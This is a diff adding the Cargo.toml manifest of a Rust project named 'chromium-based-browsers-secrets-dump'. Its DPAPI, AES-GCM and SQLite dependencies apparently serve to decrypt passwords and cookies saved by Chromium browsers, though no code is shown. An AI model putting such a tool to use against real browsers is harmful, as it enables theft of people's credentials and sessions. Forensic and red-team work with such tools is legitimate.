@@ -1,0 +1,13 @@
+[package]
+name = "chromium-based-browsers-secrets-dump"
+version = "0.1.0"
+edition = "2024"
+
+[dependencies]
+aes-gcm = "0.10.3"
+base64 = "0.22.1"
+hex = "0.4.3"
+regex = "1.10.5"
+rusqlite = { version = "0.31.0", features = ["bundled"] }
+serde_json = "1.0.117"
+winapi = { version = "0.3.9", features = ["dpapi", "wincrypt", "minwindef", "winbase"] }
